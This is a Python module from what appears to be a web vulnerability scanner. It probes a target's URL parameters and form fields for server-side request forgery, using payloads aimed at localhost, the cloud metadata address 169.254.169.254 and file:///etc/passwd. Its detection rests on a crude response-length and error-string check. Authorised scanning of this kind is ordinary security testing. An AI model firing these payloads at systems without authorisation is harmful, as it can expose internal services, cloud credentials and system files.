# attacks/advanced/ssrf.py
from core.base_scanner import BaseScanner
from core.utils import RequestUtils
from typing import List, Dict
import logging
from urllib.parse import urljoin

class SSRFScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            "http://127.0.0.1",              
            "http://localhost",              
            "http://169.254.169.254",       
            "file:///etc/passwd"             
        ]

    def scan(self) -> Dict:
        results = []
        response = self.make_request(self.target_url)
        if not response:
            return {'ssrf': []}

        query_params = self.extract_url_parameters(self.target_url)
        for param in query_params:
            for payload in self.payloads:
                if self.test_ssrf(self.target_url, 'get', param, payload):
                    results.append({
                        'url': self.target_url,
                        'method': 'get',
                        'parameter': param,
                        'payload': payload,
                        'vulnerability': 'Server-Side Request Forgery (SSRF)',
                        'severity': 'High'
                    })

        forms = RequestUtils.extract_forms(response.text)
        for form in forms:
            form_url = urljoin(self.target_url, form['action'] or self.target_url)
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button', 'file']:
                    for payload in self.payloads:
                        if self.test_ssrf(form_url, form['method'], input_field['name'], payload):
                            results.append({
                                'url': form_url,
                                'method': form['method'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'vulnerability': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'High'
                            })
        return {'ssrf': results}

    def test_ssrf(self, url: str, method: str, param: str, payload: str) -> bool:

        try:
            normal_data = {param: "http://example.com"}
            normal_response = self.make_request(
                url,
                method=method.upper(),
                data=normal_data if method.lower() == 'post' else None,
                params=normal_data if method.lower() == 'get' else None
            )

            data = {param: payload}
            response = self.make_request(
                url,
                method=method.upper(),
                data=data if method.lower() == 'post' else None,
                params=data if method.lower() == 'get' else None
            )

            if not response or not normal_response:
                return False

            error_patterns = [
                "Connection refused",
                "Failed to establish a new connection",
                "timed out",
                "No route to host"
            ]
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    logging.info(f"Potential SSRF vulnerability detected at {url} for parameter '{param}' using payload '{payload}' (matched error pattern).")
                    return True

            if abs(len(response.text) - len(normal_response.text)) > 100:
                logging.info(f"Potential SSRF vulnerability detected at {url} for parameter '{param}' using payload '{payload}' (response length differs).")
                return True

            return False
        except Exception as e:
            logging.error(f"Error testing SSRF on {url} for parameter '{param}': {e}")
            return False

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []
